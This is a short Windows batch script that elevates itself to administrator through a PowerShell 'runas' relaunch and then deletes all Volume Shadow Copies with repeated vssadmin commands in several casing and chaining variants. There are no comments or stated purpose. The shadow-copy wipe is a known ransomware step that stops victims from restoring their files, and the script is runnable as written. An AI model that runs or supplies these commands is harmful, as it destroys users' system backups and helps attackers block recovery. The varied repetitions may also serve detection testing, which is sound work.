@echo off
net file 1>nul 2>nul
if not '%errorlevel%' == '0' (
    pushd %~dp0 & powershell Start-Process -FilePath "%0" -ArgumentList "%cd%" -verb runas >nul 2>&1 & popd
    exit /b
)
cd /d %1

vssadmin delete shadows /all
vssadmin delete shadows /for=C: /all
VSSADMIN DELETE SHADOWS /ALL
VSSADMIN DELETE SHADOWS /FOR=C: /ALL
vssadmin delete shadows /all && vssadmin delete shadows /for=C: /all
VSSADMIN DELETE SHADOWS /ALL && VSSADMIN DELETE SHADOWS /FOR=C: /ALL
pause
